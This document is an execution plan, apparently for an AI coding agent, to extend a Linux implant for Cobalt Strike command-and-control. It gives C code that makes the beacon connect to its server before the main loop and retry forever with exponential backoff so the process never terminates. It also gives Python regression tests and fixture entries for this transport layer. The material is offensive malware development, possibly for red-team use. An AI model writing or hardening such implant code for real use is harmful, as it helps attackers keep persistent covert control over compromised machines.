---
phase: 03-reverse-tcp-transport
plan: "03"
type: execute
wave: 2
depends_on:
  - 03-01
files_modified:
  - implant/src/main.c
  - implant/tests/test_transport_mode.py
  - implant/tests/fixture_index.json
  - implant/tests/run_regression.py
autonomous: true
requirements:
  - NET-03

must_haves:
  truths:
    - "main.c calls transport_connect() once before the main loop (after beacon_init and pivot_init)"
    - "TCP check-in failure triggers reconnect/backoff: 2s base, doubles each attempt, caps at 120s, infinite retries"
    - "Backoff delay resets to 2s after a successful check-in"
    - "Process never terminates due to TCP connection failure"
    - "Regression test for TCP build compiles and links correctly"
    - "Regression test for reconnect/backoff constants are present and within bounds"
    - "transport suite is registered in fixture_index.json with NET-03 requirement traceability"
    - "transport suite runs as part of quick and full regression via run_regression.sh"
  artifacts:
    - path: "implant/src/main.c"
      provides: "transport_connect() call before main loop, reconnect/backoff after transport error"
    - path: "implant/tests/test_transport_mode.py"
      provides: "Transport mode regression suite: TCP build compilation check, reconnect constant bounds, interface contract check"
    - path: "implant/tests/fixture_index.json"
      provides: "transport suite fixtures registered with NET-03 requirement IDs"
    - path: "implant/tests/run_regression.py"
      provides: "transport suite dispatch registered in SUITE_MODULES"
  key_links:
    - from: "implant/src/main.c"
      to: "implant/headers/transport.h"
      via: "#include transport.h; calls transport_connect() before main loop"
      pattern: "transport_connect"
    - from: "implant/tests/run_regression.py"
      to: "implant/tests/test_transport_mode.py"
      via: "SUITE_MODULES['transport'] dispatch"
---

<objective>
Add reconnect/backoff to main.c for TCP transport, and create the regression test suite for transport mode.

This plan depends on Plan 01 (transport.h must exist before main.c can include it). Plan 02 (CNA/Python) is independent and does not block this plan.

Two parts:
1. main.c: call transport_connect() once before the main loop; add reconnect/backoff on check-in failure (NET-03 — bounded, no process termination)
2. Regression tests: test_transport_mode.py verifies TCP build compiles, reconnect constants are in bounds, and transport.h interface contract is correct; registered in fixture_index.json and run_regression.py

Purpose: After this plan, Phase 3 is complete. NET-01, NET-02, NET-03 are all implemented and verified.

Output: Updated main.c, new test_transport_mode.py, updated fixture_index.json and run_regression.py.
</objective>

<execution_context>
@/Users/maleick/.claude/get-shit-done/workflows/execute-plan.md
@/Users/maleick/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/phases/03-reverse-tcp-transport/03-CONTEXT.md
@.planning/phases/03-reverse-tcp-transport/03-RESEARCH.md
@.planning/phases/03-reverse-tcp-transport/03-01-SUMMARY.md

<interfaces>
<!-- Contracts this plan consumes (from Plan 01 output) -->

From implant/headers/transport.h (created in Plan 01):
```c
int transport_connect(void);
int transport_checkin(const uint8_t *metadata, size_t metadata_len,
                      uint8_t **task_data, size_t *task_len);
int transport_send_output(const uint8_t *data, size_t data_len, const char *session_id);
```

From implant/src/main.c (current structure):
```c
// After profile_load() and beacon_init() and pivot_init():
// Current main loop calls beacon_checkin(&state) — returns int (0 = success)
// usleep(10000) inside loop
// g_sleep_time_ms and g_jitter_percent are global ints
// beacon_sleep() called at end of loop
```

From implant/tests/run_regression.py (current SUITE_MODULES dict):
```python
SUITE_MODULES = {
    "parser":   SCRIPT_DIR / "test_task_parser.py",
    "protocol": SCRIPT_DIR / "test_protocol_roundtrip.py",
    "smoke":    SCRIPT_DIR / "test_command_smoke.py",
    "profile":  SCRIPT_DIR / "test_profile_matrix.py",
}
```

From implant/tests/fixture_index.json (current structure):
```json
{
  "schema_version": "1.0",
  "generated_on": "...",
  "default_assertion_mode": "strict",
  "fixtures": [ ... array of fixture objects ... ]
}
```

Each fixture object shape (from existing entries):
```json
{
  "fixture_id": "NET-03-transport-reconnect-bounds",
  "suite": "transport",
  "modes": ["quick", "full"],
  "requirement": "NET-03",
  "description": "Reconnect/backoff constants are within expected bounds"
}
```
</interfaces>
</context>

<tasks>

<task type="auto">
  <name>Task 1: Update main.c — transport_connect before main loop, reconnect/backoff on failure</name>
  <files>
    implant/src/main.c
  </files>
  <action>
Read the current main.c file first. Then make the following targeted changes.

**Step A — Add transport.h include**

After the existing includes (near the top of main.c), add:
```c
#include "transport.h"
```

This must appear after the other project headers (beacon.h, config.h, profile.h, etc.).

**Step B — Add reconnect/backoff constants and state**

After the existing global variable declarations (g_beacon_state, g_sleep_time_ms, g_jitter_percent), add:

```c
/* TCP reconnect/backoff constants (used in TCP mode; HTTP transport_connect is a no-op) */
#define TCP_RECONNECT_BASE_MS    2000
#define TCP_RECONNECT_MAX_MS   120000

/* Current reconnect delay — doubles on each failure, resets to base on success */
static int g_tcp_reconnect_delay_ms = TCP_RECONNECT_BASE_MS;
```

**Step C — Call transport_connect() before the main loop**

In the main() function, after the existing `pivot_init()` call and before the main `while (running)` loop, add:

```c
/* Establish transport connection (TCP: connect socket; HTTP: no-op) */
if (transport_connect() != 0) {
    DEBUG_PRINT("[TRANSPORT] Initial connection failed — will retry in main loop\n");
    /* Do not abort — reconnect logic in the main loop handles this */
}
```

**Step D — Add reconnect/backoff after beacon_checkin failure in the main loop**

The current main loop body has:
```c
if (beacon_checkin(&state) == 0)
{
    DEBUG_PRINT("Check-in successful (%s)\n", IMPLANT_VERSION);
}
```

Replace with:
```c
if (beacon_checkin(&state) == 0)
{
    DEBUG_PRINT("Check-in successful (%s)\n", IMPLANT_VERSION);
    /* Reset reconnect delay on successful check-in */
    g_tcp_reconnect_delay_ms = TCP_RECONNECT_BASE_MS;
}
else
{
    /* Transport error — apply bounded exponential backoff and attempt reconnect.
     * Process MUST NOT terminate. Reconnect is handled here for both TCP (real
     * reconnect) and HTTP (transport_connect is a no-op, backoff still applies). */
    DEBUG_PRINT("[TRANSPORT] check-in failed — reconnect in %dms\n",
                g_tcp_reconnect_delay_ms);
    usleep((unsigned int)g_tcp_reconnect_delay_ms * 1000);
    g_tcp_reconnect_delay_ms *= 2;
    if (g_tcp_reconnect_delay_ms > TCP_RECONNECT_MAX_MS) {
        g_tcp_reconnect_delay_ms = TCP_RECONNECT_MAX_MS;
    }
    transport_connect(); /* attempt reconnect; if it fails, next loop iteration retries */
}
```

IMPORTANT: The #ifdef TRANSPORT_TCP guard must NOT be used here. transport_connect() is a no-op for HTTP and a real connect for TCP — the main loop does not need to know which transport is active. This is the whole point of transport.h.

After the changes, verify the build still passes:
- HTTP build: `make clean all` (transport_connect is a no-op in http.c)
- TCP build: `make TRANSPORT=tcp clean all` (transport_connect connects the socket)
  </action>
  <verify>
    <automated>cd /opt/CobaltStrike-Linux-Beacon/implant && make clean all 2>&1 | tail -3 && make TRANSPORT=tcp clean all 2>&1 | tail -3</automated>
  </verify>
  <done>main.c includes transport.h and calls transport_connect() before the main loop. Check-in failure path triggers usleep backoff and transport_connect() retry. Backoff resets on success. TCP_RECONNECT_BASE_MS=2000, TCP_RECONNECT_MAX_MS=120000 defined. Both HTTP and TCP builds pass with zero warnings.</done>
</task>

<task type="auto">
  <name>Task 2: Add transport regression suite — test_transport_mode.py, fixture_index.json, run_regression.py</name>
  <files>
    implant/tests/test_transport_mode.py
    implant/tests/fixture_index.json
    implant/tests/run_regression.py
  </files>
  <action>
**Step A — Create implant/tests/test_transport_mode.py**

This test module verifies the transport layer without requiring a live Team Server. It uses source inspection and build compilation to confirm correctness.

```python
#!/usr/bin/env python3
"""Transport mode regression suite.

Verifies Phase 3 TCP transport without requiring a live Team Server:
- transport.h interface contract is present (source inspection)
- TCP transport module exports correct symbols (source inspection)
- main.c has reconnect/backoff logic (source inspection)
- Reconnect constants are within expected bounds (source inspection)
- TCP build compiles cleanly (build verification)

Fixture IDs: NET-01-transport-interface, NET-03-reconnect-constants, NET-03-reconnect-no-terminate
Requirement traceability: NET-01, NET-03
"""

from __future__ import annotations

import pathlib
import re
import subprocess
import sys
from typing import List, Tuple

REPO_ROOT = pathlib.Path(__file__).resolve().parent.parent.parent
IMPLANT_DIR = REPO_ROOT / "implant"
TRANSPORT_H = IMPLANT_DIR / "headers" / "transport.h"
TCP_C = IMPLANT_DIR / "src" / "tcp.c"
MAIN_C = IMPLANT_DIR / "src" / "main.c"
HTTP_C = IMPLANT_DIR / "src" / "http.c"
BEACON_C = IMPLANT_DIR / "src" / "beacon.c"

REQUIRED_TRANSPORT_SYMBOLS = [
    "transport_connect",
    "transport_checkin",
    "transport_send_output",
]

# Reconnect bounds: base >= 1s, max <= 300s (5 min), max > base
RECONNECT_BASE_MIN_MS = 1000
RECONNECT_BASE_MAX_MS = 10000
RECONNECT_MAX_MIN_MS  = 30000
RECONNECT_MAX_MAX_MS  = 300000


def check_transport_interface(fixtures: list) -> List[Tuple[str, bool, str]]:
    """NET-01-transport-interface: transport.h declares all required symbols."""
    results = []
    if not TRANSPORT_H.exists():
        results.append(("NET-01-transport-interface", False,
                        f"transport.h not found at {TRANSPORT_H}"))
        return results

    content = TRANSPORT_H.read_text(encoding="utf-8")
    for sym in REQUIRED_TRANSPORT_SYMBOLS:
        found = sym in content
        results.append((
            f"NET-01-transport-interface:{sym}",
            found,
            f"transport.h {'declares' if found else 'MISSING'} {sym}()",
        ))
    return results


def check_beacon_c_migration(fixtures: list) -> List[Tuple[str, bool, str]]:
    """NET-01-beacon-migration: beacon.c must not directly call http_get/http_post."""
    results = []
    if not BEACON_C.exists():
        results.append(("NET-01-beacon-migration", False, f"beacon.c not found at {BEACON_C}"))
        return results

    content = BEACON_C.read_text(encoding="utf-8")
    for banned in ["http_get(", "http_post("]:
        found = banned in content
        results.append((
            f"NET-01-beacon-migration:{banned.rstrip('(')}",
            not found,
            f"beacon.c {'STILL calls' if found else 'correctly does not call'} {banned.rstrip('(')}()",
        ))

    uses_transport = "transport_checkin" in content and "transport_send_output" in content
    results.append((
        "NET-01-beacon-migration:transport-calls",
        uses_transport,
        f"beacon.c {'uses' if uses_transport else 'MISSING'} transport_checkin/transport_send_output",
    ))
    return results


def check_reconnect_constants(fixtures: list) -> List[Tuple[str, bool, str]]:
    """NET-03-reconnect-constants: reconnect constants exist and are within bounds."""
    results = []
    if not MAIN_C.exists():
        results.append(("NET-03-reconnect-constants", False, f"main.c not found at {MAIN_C}"))
        return results

    content = MAIN_C.read_text(encoding="utf-8")

    base_match = re.search(r"TCP_RECONNECT_BASE_MS\s+(\d+)", content)
    max_match  = re.search(r"TCP_RECONNECT_MAX_MS\s+(\d+)", content)

    if not base_match:
        results.append(("NET-03-reconnect-constants:base", False,
                        "TCP_RECONNECT_BASE_MS not defined in main.c"))
    else:
        base_ms = int(base_match.group(1))
        ok = RECONNECT_BASE_MIN_MS <= base_ms <= RECONNECT_BASE_MAX_MS
        results.append(("NET-03-reconnect-constants:base", ok,
                        f"TCP_RECONNECT_BASE_MS={base_ms}ms ({'OK' if ok else f'out of bounds [{RECONNECT_BASE_MIN_MS},{RECONNECT_BASE_MAX_MS}]'})"))

    if not max_match:
        results.append(("NET-03-reconnect-constants:max", False,
                        "TCP_RECONNECT_MAX_MS not defined in main.c"))
    else:
        max_ms = int(max_match.group(1))
        ok = RECONNECT_MAX_MIN_MS <= max_ms <= RECONNECT_MAX_MAX_MS
        results.append(("NET-03-reconnect-constants:max", ok,
                        f"TCP_RECONNECT_MAX_MS={max_ms}ms ({'OK' if ok else f'out of bounds [{RECONNECT_MAX_MIN_MS},{RECONNECT_MAX_MAX_MS}]'})"))

    if base_match and max_match:
        base_ms = int(base_match.group(1))
        max_ms  = int(max_match.group(1))
        ok = max_ms > base_ms
        results.append(("NET-03-reconnect-constants:ordering", ok,
                        f"TCP_RECONNECT_MAX_MS ({max_ms}) {'>' if ok else 'NOT >'} TCP_RECONNECT_BASE_MS ({base_ms})"))

    return results


def check_reconnect_no_terminate(fixtures: list) -> List[Tuple[str, bool, str]]:
    """NET-03-reconnect-no-terminate: main.c does not call exit/abort on transport error."""
    results = []
    if not MAIN_C.exists():
        results.append(("NET-03-reconnect-no-terminate", False, f"main.c not found"))
        return results

    content = MAIN_C.read_text(encoding="utf-8")
    has_transport_connect = "transport_connect()" in content
    has_backoff = "g_tcp_reconnect_delay_ms" in content

    results.append((
        "NET-03-reconnect-no-terminate:reconnect-call",
        has_transport_connect,
        f"main.c {'has' if has_transport_connect else 'MISSING'} transport_connect() call",
    ))
    results.append((
        "NET-03-reconnect-no-terminate:backoff-state",
        has_backoff,
        f"main.c {'has' if has_backoff else 'MISSING'} g_tcp_reconnect_delay_ms backoff state",
    ))
    return results


def check_tcp_build(fixtures: list) -> List[Tuple[str, bool, str]]:
    """NET-01-tcp-build: TCP transport variant compiles cleanly under -Wall -Wextra."""
    if not TCP_C.exists():
        return [("NET-01-tcp-build", False, f"tcp.c not found at {TCP_C}")]

    result = subprocess.run(
        ["make", "TRANSPORT=tcp", "clean", "all"],
        cwd=str(IMPLANT_DIR),
        capture_output=True,
        text=True,
        timeout=120,
    )
    ok = result.returncode == 0
    warnings = [ln for ln in result.stderr.splitlines() if "warning:" in ln]
    if ok and not warnings:
        return [("NET-01-tcp-build", True, "TCP build succeeded with zero warnings")]
    elif ok and warnings:
        return [("NET-01-tcp-build", False,
                 f"TCP build succeeded but has {len(warnings)} warning(s): {warnings[0]}")]
    else:
        err_lines = result.stderr.splitlines()
        first_err = next((ln for ln in err_lines if "error:" in ln), "unknown error")
        return [("NET-01-tcp-build", False, f"TCP build FAILED: {first_err}")]


def run_suite(fixtures: list, verbose: bool = False) -> Tuple[int, int]:
    """Run all transport mode checks. Returns (passed, total)."""
    all_checks = []
    for check_fn in [
        check_transport_interface,
        check_beacon_c_migration,
        check_reconnect_constants,
        check_reconnect_no_terminate,
        check_tcp_build,
    ]:
        all_checks.extend(check_fn(fixtures))

    passed = sum(1 for _, ok, _ in all_checks if ok)
    total  = len(all_checks)

    for fixture_id, ok, msg in all_checks:
        status = "PASS" if ok else "FAIL"
        if verbose or not ok:
            print(f"  [{status}] {fixture_id}: {msg}")

    return passed, total


if __name__ == "__main__":
    verbose = "--verbose" in sys.argv or "-v" in sys.argv
    passed, total = run_suite([], verbose=verbose)
    failed = total - passed
    print(f"\ntransport: {passed}/{total} passed", end="")
    if failed:
        print(f", {failed} FAILED")
        sys.exit(1)
    else:
        print()
        sys.exit(0)
```

**Step B — Update implant/tests/fixture_index.json**

Read the current fixture_index.json. Append the following entries to the "fixtures" array:

```json
{
  "fixture_id": "NET-01-transport-interface",
  "suite": "transport",
  "modes": ["quick", "full"],
  "requirement": "NET-01",
  "description": "transport.h declares transport_connect, transport_checkin, transport_send_output"
},
{
  "fixture_id": "NET-01-beacon-migration",
  "suite": "transport",
  "modes": ["quick", "full"],
  "requirement": "NET-01",
  "description": "beacon.c uses transport_* symbols, not http_get/http_post directly"
},
{
  "fixture_id": "NET-01-tcp-build",
  "suite": "transport",
  "modes": ["full"],
  "requirement": "NET-01",
  "description": "TCP transport variant (TRANSPORT=tcp) compiles cleanly under -Wall -Wextra"
},
{
  "fixture_id": "NET-03-reconnect-constants",
  "suite": "transport",
  "modes": ["quick", "full"],
  "requirement": "NET-03",
  "description": "TCP reconnect base/max constants defined in main.c and within expected bounds"
},
{
  "fixture_id": "NET-03-reconnect-no-terminate",
  "suite": "transport",
  "modes": ["quick", "full"],
  "requirement": "NET-03",
  "description": "main.c calls transport_connect() for reconnect and maintains backoff state"
}
```

**Step C — Update implant/tests/run_regression.py**

Add the transport suite to SUITE_MODULES. Read the current run_regression.py, find the SUITE_MODULES dict, and add:

```python
"transport": SCRIPT_DIR / "test_transport_mode.py",
```

The dict should now be:
```python
SUITE_MODULES = {
    "parser":    SCRIPT_DIR / "test_task_parser.py",
    "protocol":  SCRIPT_DIR / "test_protocol_roundtrip.py",
    "smoke":     SCRIPT_DIR / "test_command_smoke.py",
    "profile":   SCRIPT_DIR / "test_profile_matrix.py",
    "transport": SCRIPT_DIR / "test_transport_mode.py",
}
```

No other changes to run_regression.py are needed — the transport suite fixtures use modes ["quick", "full"] (except NET-01-tcp-build which is "full" only), so the existing filter_fixtures logic handles suite/mode filtering correctly.
  </action>
  <verify>
    <automated>cd /opt/CobaltStrike-Linux-Beacon/implant && python3 tests/test_transport_mode.py --verbose 2>&1</automated>
  </verify>
  <done>test_transport_mode.py runs and all checks pass. fixture_index.json contains 5 new transport suite entries. run_regression.py SUITE_MODULES includes "transport" key. `python3 tests/run_regression.py --mode quick --suite transport` runs without error.</done>
</task>

</tasks>

<verification>
1. grep "transport_connect\|TCP_RECONNECT_BASE_MS\|TCP_RECONNECT_MAX_MS\|g_tcp_reconnect_delay_ms" /opt/CobaltStrike-Linux-Beacon/implant/src/main.c — all four must appear
2. cd /opt/CobaltStrike-Linux-Beacon/implant && make clean all 2>&1 | tail -3 — HTTP build, zero warnings
3. cd /opt/CobaltStrike-Linux-Beacon/implant && make TRANSPORT=tcp clean all 2>&1 | tail -3 — TCP build, zero warnings
4. python3 /opt/CobaltStrike-Linux-Beacon/implant/tests/test_transport_mode.py --verbose — all PASS
5. cd /opt/CobaltStrike-Linux-Beacon/implant && bash tests/run_regression.sh --mode quick 2>&1 | tail -10 — includes transport suite, passes
</verification>

<success_criteria>
- main.c: transport.h included, transport_connect() called before main loop, reconnect/backoff on check-in failure with 2s base / 120s max / infinite retries, reset on success
- test_transport_mode.py: 5 checks across NET-01 and NET-03 — interface contract, beacon migration, build verification, reconnect constants, no-terminate
- fixture_index.json: 5 transport suite entries with requirement IDs NET-01/NET-03
- run_regression.py: transport suite registered in SUITE_MODULES
- All regression suites pass: bash tests/run_regression.sh --mode quick
</success_criteria>

<output>
After completion, create `.planning/phases/03-reverse-tcp-transport/03-03-SUMMARY.md`
</output>
